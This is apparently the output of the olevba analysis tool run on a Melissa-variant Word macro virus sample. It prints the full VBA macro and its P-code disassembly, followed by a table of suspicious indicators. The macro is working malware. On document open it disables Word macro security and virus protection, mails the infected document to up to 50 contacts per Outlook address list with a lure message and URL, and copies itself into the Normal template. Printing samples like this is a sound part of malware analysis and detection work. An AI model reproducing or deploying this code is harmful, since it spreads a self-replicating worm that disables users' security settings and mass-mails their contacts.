olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Melissa.ao
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO Rules.cls 
in file: Virus.MSWord.Melissa.ao - OLE stream: 'Macros/VBA/Rules'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Open()
On Error Resume Next
asdf = 1
Dim udo, dmn, buoas
asdf = 2
If System.PrivateProfileString("", "HKEY_C" & "URRENT_USER\Softw" & "are\Mic" & "rosoft\Off" & "ice\9.0\Wo" & "rd\Secu" & "rity", "Le" & "vel") = "" Then
asdf = 3
CommandBars("Too" & "ls").Controls("Mac" & "ro").Enabled = False
asdf = 4
Options.ConfirmConversions = (3 - 3): Options.VirusProtection = (4 - 4): Options.SaveNormalPrompt = (5 - 5)
asdf = 5
Else
asdf = 6
CommandBars("Mac" & "ro").Controls("Secu" & "rity...").Enabled = False
asdf = 7
System.PrivateProfileString("", "HKEY_CUR" & "RENT_USER\Soft" & "ware\Micro" & "soft\Off" & "ice\9.0\W" & "ord\Se" & "curity", "Le" & "vel") = 1&
asdf = 7
End If
asdf = 7
Set udo = CreateObject("Outl" & "ook.Applic" & "ation")
asdf = 7
Set dmn = udo.GetNameSpace("M" & "API")
asdf = 7
If System.PrivateProfileString("", "HKEY_CUR" & "RENT_USER\Soft" & "ware\Micro" & "soft\Of" & "fice\", "Rules?") <> "Rules" Then
asdf = 7
If udo = "Out" & "look" Then
asdf = 7
dmn.Logon "profile", "password"
asdf = 7
    For y = 1 To dmn.AddressLists.Count
asdf = 7
        Set abab = dmn.AddressLists(y)
asdf = 7
        x = 1
asdf = 7
        Set buoas = udo.CreateItem(0)
asdf = 7
        For oo = 1 To abab.AddressEntries.Count
asdf = 7
            bred = abab.AddressEntries(x)
asdf = 7
            buoas.Recipients.Add bred
asdf = 7
            x = x + 1
asdf = 7
            If x > 50 Then oo = abab.AddressEntries.Count
asdf = 7
         Next oo
asdf = 7
         buoas.Subject = "Îáåùàííîå îò " & Application.UserName
asdf = 7
         buoas.Body = "Ïðèâåò! Â àòòà÷å âåùü, êîòîðóþ ÿ òåáå îáåùàë;) Çàõîäè òàêæå íà ìîé íîâûé ðåñóðñèê : http://SuperBest.da.ru/"
asdf = 7
         buoas.Attachments.Add ActiveDocument.FullName
asdf = 7
         buoas.Send
asdf = 7
         bred = ""
asdf = 7
    Next y
asdf = 7
dmn.Logoff
asdf = 7
End If
asdf = 7
System.PrivateProfileString("", "HKEY_CURR" & "ENT_USER\Sof" & "tware\Mi" & "crosoft\Of" & "fice\", "Rules?") = "Rules"
asdf = 7
End If
asdf = 7
Set AAAA = ActiveDocument.VBProject.VBComponents.Item(1)
asdf = 7
Set EEEE = NormalTemplate.VBProject.VBComponents.Item(1)
asdf = 7
CCCC = EEEE.CodeModule.CountOfLines
asdf = 7
DDDD = AAAA.CodeModule.CountOfLines
asdf = 7
BBB = 2
asdf = 7
If AAAA.Name <> "Rules" Then
asdf = 7
If DDDD > 0 Then _
asdf = 7
AAAA.CodeModule.DeleteLines 1, DDDD
asdf = 7
Set TI = AAAA
asdf = 7
AAAA.Name = "Rules"
asdf = 7
HHHH = True
asdf = 7
End If
asdf = 7
If EEEE.Name <> "Rules" Then
asdf = 7
If CCCC > 0 Then _
asdf = 7
EEEE.CodeModule.DeleteLines 1, CCCC
asdf = 7
Set TI = EEEE
asdf = 7
EEEE.Name = "Rules"
asdf = 7
GGGG = True
asdf = 7
End If
asdf = 7
If GGGG <> True And HHHH <> True Then GoTo FFFF
asdf = 7
If GGGG = True Then
asdf = 7
Do While AAAA.CodeModule.Lines(1, 1) = ""
asdf = 7
AAAA.CodeModule.DeleteLines 1
asdf = 7
Loop
asdf = 7
TI.CodeModule.AddFromString ("Priva" & "te S" & "ub D" & "ocument_Cl" & "ose()")
asdf = 7
Do While AAAA.CodeModule.Lines(BBB, 1) <> ""
asdf = 7
TI.CodeModule.InsertLines BBB, AAAA.CodeModule.Lines(BBB, 1)
asdf = 7
BBB = BBB + 1
asdf = 7
Loop
asdf = 7
End If
asdf = 7
If HHHH = True Then
asdf = 7
Do While EEEE.CodeModule.Lines(1, 1) = ""
asdf = 7
EEEE.CodeModule.DeleteLines 1
asdf = 7
Loop
asdf = 7
TI.CodeModule.AddFromString ("Priv" & "ate S" & "ub Do" & "cument_Op" & "en()")
asdf = 7
Do While EEEE.CodeModule.Lines(BBB, 1) <> ""
asdf = 7
TI.CodeModule.InsertLines BBB, EEEE.CodeModule.Lines(BBB, 1)
asdf = 7
BBB = BBB + 1
asdf = 7
Loop
asdf = 7
End If
asdf = 7
FFFF:
asdf = 7
If CCCC <> 0 And DDDD = 0 And (InStr(1, ActiveDocument.Name, "Docu" & "ment") = False) Then
asdf = 7
ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
asdf = 7
ElseIf (InStr(1, ActiveDocument.Name, "Document") <> False) Then
asdf = 7
ActiveDocument.Saved = True
asdf = 7
End If
asdf = 7
End Sub

-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Melissa.ao
' ===============================================================================
' Module streams:
' Macros/VBA/Rules - 7781 bytes
' Line #0:
' 	FuncDefn (Private Sub Document_Open())
' Line #1:
' 	OnError (Resume Next) 
' Line #2:
' 	LitDI2 0x0001 
' 	St asdf 
' Line #3:
' 	Dim 
' 	VarDefn udo
' 	VarDefn dmn
' 	VarDefn buoas
' Line #4:
' 	LitDI2 0x0002 
' 	St asdf 
' Line #5:
' 	LitStr 0x0000 ""
' 	LitStr 0x0006 "HKEY_C"
' 	LitStr 0x0011 "URRENT_USER\Softw"
' 	Concat 
' 	LitStr 0x0007 "are\Mic"
' 	Concat 
' 	LitStr 0x000A "rosoft\Off"
' 	Concat 
' 	LitStr 0x000A "ice\9.0\Wo"
' 	Concat 
' 	LitStr 0x0007 "rd\Secu"
' 	Concat 
' 	LitStr 0x0004 "rity"
' 	Concat 
' 	LitStr 0x0002 "Le"
' 	LitStr 0x0003 "vel"
' 	Concat 
' 	Ld System 
' 	ArgsMemLd PrivateProfileString 0x0003 
' 	LitStr 0x0000 ""
' 	Eq 
' 	IfBlock 
' Line #6:
' 	LitDI2 0x0003 
' 	St asdf 
' Line #7:
' 	LitVarSpecial (False)
' 	LitStr 0x0003 "Mac"
' 	LitStr 0x0002 "ro"
' 	Concat 
' 	LitStr 0x0003 "Too"
' 	LitStr 0x0002 "ls"
' 	Concat 
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt Enabled 
' Line #8:
' 	LitDI2 0x0004 
' 	St asdf 
' Line #9:
' 	LitDI2 0x0003 
' 	LitDI2 0x0003 
' 	Sub 
' 	Paren 
' 	Ld Options 
' 	MemSt ConfirmConversions 
' 	BoS 0x0000 
' 	LitDI2 0x0004 
' 	LitDI2 0x0004 
' 	Sub 
' 	Paren 
' 	Ld Options 
' 	MemSt VirusProtection 
' 	BoS 0x0000 
' 	LitDI2 0x0005 
' 	LitDI2 0x0005 
' 	Sub 
' 	Paren 
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #10:
' 	LitDI2 0x0005 
' 	St asdf 
' Line #11:
' 	ElseBlock 
' Line #12:
' 	LitDI2 0x0006 
' 	St asdf 
' Line #13:
' 	LitVarSpecial (False)
' 	LitStr 0x0004 "Secu"
' 	LitStr 0x0007 "rity..."
' 	Concat 
' 	LitStr 0x0003 "Mac"
' 	LitStr 0x0002 "ro"
' 	Concat 
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt Enabled 
' Line #14:
' 	LitDI2 0x0007 
' 	St asdf 
' Line #15:
' 	LitDI4 0x0001 0x0000 
' 	LitStr 0x0000 ""
' 	LitStr 0x0008 "HKEY_CUR"
' 	LitStr 0x000E "RENT_USER\Soft"
' 	Concat 
' 	LitStr 0x000A "ware\Micro"
' 	Concat 
' 	LitStr 0x0008 "soft\Off"
' 	Concat 
' 	LitStr 0x0009 "ice\9.0\W"
' 	Concat 
' 	LitStr 0x0006 "ord\Se"
' 	Concat 
' 	LitStr 0x0006 "curity"
' 	Concat 
' 	LitStr 0x0002 "Le"
' 	LitStr 0x0003 "vel"
' 	Concat 
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #16:
' 	LitDI2 0x0007 
' 	St asdf 
' Line #17:
' 	EndIfBlock 
' Line #18:
' 	LitDI2 0x0007 
' 	St asdf 
' Line #19:
' 	SetStmt 
' 	LitStr 0x0004 "Outl"
' 	LitStr 0x000A "ook.Applic"
' 	Concat 
' 	LitStr 0x0005 "ation"
' 	Concat 
' 	ArgsLd CreateObject 0x0001 
' 	Set udo 
' Line #20:
' 	LitDI2 0x0007 
' 	St asdf 
' Line #21:
' 	SetStmt 
' 	LitStr 0x0001 "M"
' 	LitStr 0x0003 "API"
' 	Concat 
' 	Ld udo 
' 	ArgsMemLd GetNameSpace 0x0001 
' 	Set dmn 
' Line #22:
' 	LitDI2 0x0007 
' 	St asdf 
' Line #23:
' 	LitStr 0x0000 ""
' 	LitStr 0x0008 "HKEY_CUR"
' 	LitStr 0x000E "RENT_USER\Soft"
' 	Concat 
' 	LitStr 0x000A "ware\Micro"
' 	Concat 
' 	LitStr 0x0007 "soft\Of"
' 	Concat 
' 	LitStr 0x0005 "fice\"
' 	Concat 
' 	LitStr 0x0006 "Rules?"
' 	Ld System 
' 	ArgsMemLd PrivateProfileString 0x0003 
' 	LitStr 0x0005 "Rules"
' 	Ne 
' 	IfBlock 
' Line #24:
' 	LitDI2 0x0007 
' 	St asdf 
' Line #25:
' 	Ld udo 
' 	LitStr 0x0003 "Out"
' 	LitStr 0x0004 "look"
' 	Concat 
' 	Eq 
' 	IfBlock 
' Line #26:
' 	LitDI2 0x0007 
' 	St asdf 
' Line #27:
' 	LitStr 0x0007 "profile"
' 	LitStr 0x0008 "password"
' 	Ld dmn 
' 	ArgsMemCall Logon 0x0002 
' Line #28:
' 	LitDI2 0x0007 
' 	St asdf 
' Line #29:
' 	StartForVariable 
' 	Ld y 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld dmn 
' 	MemLd AddressLists 
' 	MemLd Count 
' 	For 
' Line #30:
' 	LitDI2 0x0007 
' 	St asdf 
' Line #31:
' 	SetStmt 
' 	Ld y 
' 	Ld dmn 
' 	ArgsMemLd AddressLists 0x0001 
' 	Set abab 
' Line #32:
' 	LitDI2 0x0007 
' 	St asdf 
' Line #33:
' 	LitDI2 0x0001 
' 	St x 
' Line #34:
' 	LitDI2 0x0007 
' 	St asdf 
' Line #35:
' 	SetStmt 
' 	LitDI2 0x0000 
' 	Ld udo 
' 	ArgsMemLd CreateItem 0x0001 
' 	Set buoas 
' Line #36:
' 	LitDI2 0x0007 
' 	St asdf 
' Line #37:
' 	StartForVariable 
' 	Ld oo 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld abab 
' 	MemLd AddressEntries 
' 	MemLd Count 
' 	For 
' Line #38:
' 	LitDI2 0x0007 
' 	St asdf 
' Line #39:
' 	Ld x 
' 	Ld abab 
' 	ArgsMemLd AddressEntries 0x0001 
' 	St bred 
' Line #40:
' 	LitDI2 0x0007 
' 	St asdf 
' Line #41:
' 	Ld bred 
' 	Ld buoas 
' 	MemLd Recipients 
' 	ArgsMemCall Add 0x0001 
' Line #42:
' 	LitDI2 0x0007 
' 	St asdf 
' Line #43:
' 	Ld x 
' 	LitDI2 0x0001 
' 	Add 
' 	St x 
' Line #44:
' 	LitDI2 0x0007 
' 	St asdf 
' Line #45:
' 	Ld x 
' 	LitDI2 0x0032 
' 	Gt 
' 	If 
' 	BoSImplicit 
' 	Ld abab 
' 	MemLd AddressEntries 
' 	MemLd Count 
' 	St oo 
' 	EndIf 
' Line #46:
' 	LitDI2 0x0007 
' 	St asdf 
' Line #47:
' 	StartForVariable 
' 	Ld oo 
' 	EndForVariable 
' 	NextVar 
' Line #48:
' 	LitDI2 0x0007 
' 	St asdf 
' Line #49:
' 	LitStr 0x000D "Îáåùàííîå îò "
' 	Ld Application 
' 	MemLd UserName 
' 	Concat 
' 	Ld buoas 
' 	MemSt Subject 
' Line #50:
' 	LitDI2 0x0007 
' 	St asdf 
' Line #51:
' 	LitStr 0x006B "Ïðèâåò! Â àòòà÷å âåùü, êîòîðóþ ÿ òåáå îáåùàë;) Çàõîäè òàêæå íà ìîé íîâûé ðåñóðñèê : http://SuperBest.da.ru/"
' 	Ld buoas 
' 	MemSt Body 
' Line #52:
' 	LitDI2 0x0007 
' 	St asdf 
' Line #53:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	Ld buoas 
' 	MemLd Attachments 
' 	ArgsMemCall Add 0x0001 
' Line #54:
' 	LitDI2 0x0007 
' 	St asdf 
' Line #55:
' 	Ld buoas 
' 	ArgsMemCall Send 0x0000 
' Line #56:
' 	LitDI2 0x0007 
' 	St asdf 
' Line #57:
' 	LitStr 0x0000 ""
' 	St bred 
' Line #58:
' 	LitDI2 0x0007 
' 	St asdf 
' Line #59:
' 	StartForVariable 
' 	Ld y 
' 	EndForVariable 
' 	NextVar 
' Line #60:
' 	LitDI2 0x0007 
' 	St asdf 
' Line #61:
' 	Ld dmn 
' 	ArgsMemCall Logoff 0x0000 
' Line #62:
' 	LitDI2 0x0007 
' 	St asdf 
' Line #63:
' 	EndIfBlock 
' Line #64:
' 	LitDI2 0x0007 
' 	St asdf 
' Line #65:
' 	LitStr 0x0005 "Rules"
' 	LitStr 0x0000 ""
' 	LitStr 0x0009 "HKEY_CURR"
' 	LitStr 0x000C "ENT_USER\Sof"
' 	Concat 
' 	LitStr 0x0008 "tware\Mi"
' 	Concat 
' 	LitStr 0x000A "crosoft\Of"
' 	Concat 
' 	LitStr 0x0005 "fice\"
' 	Concat 
' 	LitStr 0x0006 "Rules?"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #66:
' 	LitDI2 0x0007 
' 	St asdf 
' Line #67:
' 	EndIfBlock 
' Line #68:
' 	LitDI2 0x0007 
' 	St asdf 
' Line #69:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set AAAA 
' Line #70:
' 	LitDI2 0x0007 
' 	St asdf 
' Line #71:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set EEEE 
' Line #72:
' 	LitDI2 0x0007 
' 	St asdf 
' Line #73:
' 	Ld EEEE 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St CCCC 
' Line #74:
' 	LitDI2 0x0007 
' 	St asdf 
' Line #75:
' 	Ld AAAA 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St DDDD 
' Line #76:
' 	LitDI2 0x0007 
' 	St asdf 
' Line #77:
' 	LitDI2 0x0002 
' 	St BBB 
' Line #78:
' 	LitDI2 0x0007 
' 	St asdf 
' Line #79:
' 	Ld AAAA 
' 	MemLd New 
' 	LitStr 0x0005 "Rules"
' 	Ne 
' 	IfBlock 
' Line #80:
' 	LitDI2 0x0007 
' 	St asdf 
' Line #81:
' 	LineCont 0x0004 05 00 00 00
' 	Ld DDDD 
' 	LitDI2 0x0000 
' 	Gt 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0007 
' 	St asdf 
' 	EndIf 
' Line #82:
' 	LitDI2 0x0001 
' 	Ld DDDD 
' 	Ld AAAA 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #83:
' 	LitDI2 0x0007 
' 	St asdf 
' Line #84:
' 	SetStmt 
' 	Ld AAAA 
' 	Set TI 
' Line #85:
' 	LitDI2 0x0007 
' 	St asdf 
' Line #86:
' 	LitStr 0x0005 "Rules"
' 	Ld AAAA 
' 	MemSt New 
' Line #87:
' 	LitDI2 0x0007 
' 	St asdf 
' Line #88:
' 	LitVarSpecial (True)
' 	St HHHH 
' Line #89:
' 	LitDI2 0x0007 
' 	St asdf 
' Line #90:
' 	EndIfBlock 
' Line #91:
' 	LitDI2 0x0007 
' 	St asdf 
' Line #92:
' 	Ld EEEE 
' 	MemLd New 
' 	LitStr 0x0005 "Rules"
' 	Ne 
' 	IfBlock 
' Line #93:
' 	LitDI2 0x0007 
' 	St asdf 
' Line #94:
' 	LineCont 0x0004 05 00 00 00
' 	Ld CCCC 
' 	LitDI2 0x0000 
' 	Gt 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0007 
' 	St asdf 
' 	EndIf 
' Line #95:
' 	LitDI2 0x0001 
' 	Ld CCCC 
' 	Ld EEEE 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #96:
' 	LitDI2 0x0007 
' 	St asdf 
' Line #97:
' 	SetStmt 
' 	Ld EEEE 
' 	Set TI 
' Line #98:
' 	LitDI2 0x0007 
' 	St asdf 
' Line #99:
' 	LitStr 0x0005 "Rules"
' 	Ld EEEE 
' 	MemSt New 
' Line #100:
' 	LitDI2 0x0007 
' 	St asdf 
' Line #101:
' 	LitVarSpecial (True)
' 	St GGGG 
' Line #102:
' 	LitDI2 0x0007 
' 	St asdf 
' Line #103:
' 	EndIfBlock 
' Line #104:
' 	LitDI2 0x0007 
' 	St asdf 
' Line #105:
' 	Ld GGGG 
' 	LitVarSpecial (True)
' 	Ne 
' 	Ld HHHH 
' 	LitVarSpecial (True)
' 	Ne 
' 	And 
' 	If 
' 	BoSImplicit 
' 	GoTo FFFF 
' 	EndIf 
' Line #106:
' 	LitDI2 0x0007 
' 	St asdf 
' Line #107:
' 	Ld GGGG 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #108:
' 	LitDI2 0x0007 
' 	St asdf 
' Line #109:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld AAAA 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x0000 ""
' 	Eq 
' 	DoWhile 
' Line #110:
' 	LitDI2 0x0007 
' 	St asdf 
' Line #111:
' 	LitDI2 0x0001 
' 	Ld AAAA 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0001 
' Line #112:
' 	LitDI2 0x0007 
' 	St asdf 
' Line #113:
' 	Loop 
' Line #114:
' 	LitDI2 0x0007 
' 	St asdf 
' Line #115:
' 	LitStr 0x0005 "Priva"
' 	LitStr 0x0004 "te S"
' 	Concat 
' 	LitStr 0x0004 "ub D"
' 	Concat 
' 	LitStr 0x000A "ocument_Cl"
' 	Concat 
' 	LitStr 0x0005 "ose()"
' 	Concat 
' 	Paren 
' 	Ld TI 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromString 0x0001 
' Line #116:
' 	LitDI2 0x0007 
' 	St asdf 
' Line #117:
' 	Ld BBB 
' 	LitDI2 0x0001 
' 	Ld AAAA 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x0000 ""
' 	Ne 
' 	DoWhile 
' Line #118:
' 	LitDI2 0x0007 
' 	St asdf 
' Line #119:
' 	Ld BBB 
' 	Ld BBB 
' 	LitDI2 0x0001 
' 	Ld AAAA 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	Ld TI 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #120:
' 	LitDI2 0x0007 
' 	St asdf 
' Line #121:
' 	Ld BBB 
' 	LitDI2 0x0001 
' 	Add 
' 	St BBB 
' Line #122:
' 	LitDI2 0x0007 
' 	St asdf 
' Line #123:
' 	Loop 
' Line #124:
' 	LitDI2 0x0007 
' 	St asdf 
' Line #125:
' 	EndIfBlock 
' Line #126:
' 	LitDI2 0x0007 
' 	St asdf 
' Line #127:
' 	Ld HHHH 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #128:
' 	LitDI2 0x0007 
' 	St asdf 
' Line #129:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld EEEE 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x0000 ""
' 	Eq 
' 	DoWhile 
' Line #130:
' 	LitDI2 0x0007 
' 	St asdf 
' Line #131:
' 	LitDI2 0x0001 
' 	Ld EEEE 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0001 
' Line #132:
' 	LitDI2 0x0007 
' 	St asdf 
' Line #133:
' 	Loop 
' Line #134:
' 	LitDI2 0x0007 
' 	St asdf 
' Line #135:
' 	LitStr 0x0004 "Priv"
' 	LitStr 0x0005 "ate S"
' 	Concat 
' 	LitStr 0x0005 "ub Do"
' 	Concat 
' 	LitStr 0x0009 "cument_Op"
' 	Concat 
' 	LitStr 0x0004 "en()"
' 	Concat 
' 	Paren 
' 	Ld TI 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromString 0x0001 
' Line #136:
' 	LitDI2 0x0007 
' 	St asdf 
' Line #137:
' 	Ld BBB 
' 	LitDI2 0x0001 
' 	Ld EEEE 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x0000 ""
' 	Ne 
' 	DoWhile 
' Line #138:
' 	LitDI2 0x0007 
' 	St asdf 
' Line #139:
' 	Ld BBB 
' 	Ld BBB 
' 	LitDI2 0x0001 
' 	Ld EEEE 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	Ld TI 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #140:
' 	LitDI2 0x0007 
' 	St asdf 
' Line #141:
' 	Ld BBB 
' 	LitDI2 0x0001 
' 	Add 
' 	St BBB 
' Line #142:
' 	LitDI2 0x0007 
' 	St asdf 
' Line #143:
' 	Loop 
' Line #144:
' 	LitDI2 0x0007 
' 	St asdf 
' Line #145:
' 	EndIfBlock 
' Line #146:
' 	LitDI2 0x0007 
' 	St asdf 
' Line #147:
' 	Label FFFF 
' Line #148:
' 	LitDI2 0x0007 
' 	St asdf 
' Line #149:
' 	Ld CCCC 
' 	LitDI2 0x0000 
' 	Ne 
' 	Ld DDDD 
' 	LitDI2 0x0000 
' 	Eq 
' 	And 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd New 
' 	LitStr 0x0004 "Docu"
' 	LitStr 0x0004 "ment"
' 	Concat 
' 	FnInStr3 
' 	LitVarSpecial (False)
' 	Eq 
' 	Paren 
' 	And 
' 	IfBlock 
' Line #150:
' 	LitDI2 0x0007 
' 	St asdf 
' Line #151:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed FileName 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0001 
' Line #152:
' 	LitDI2 0x0007 
' 	St asdf 
' Line #153:
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd New 
' 	LitStr 0x0008 "Document"
' 	FnInStr3 
' 	LitVarSpecial (False)
' 	Ne 
' 	Paren 
' 	ElseIfBlock 
' Line #154:
' 	LitDI2 0x0007 
' 	St asdf 
' Line #155:
' 	LitVarSpecial (True)
' 	Ld ActiveDocument 
' 	MemSt Saved 
' Line #156:
' 	LitDI2 0x0007 
' 	St asdf 
' Line #157:
' 	EndIfBlock 
' Line #158:
' 	LitDI2 0x0007 
' 	St asdf 
' Line #159:
' 	EndSub 
' Line #160:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |http://SuperBest.da.|URL                                          |
|          |ru/                 |                                             |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

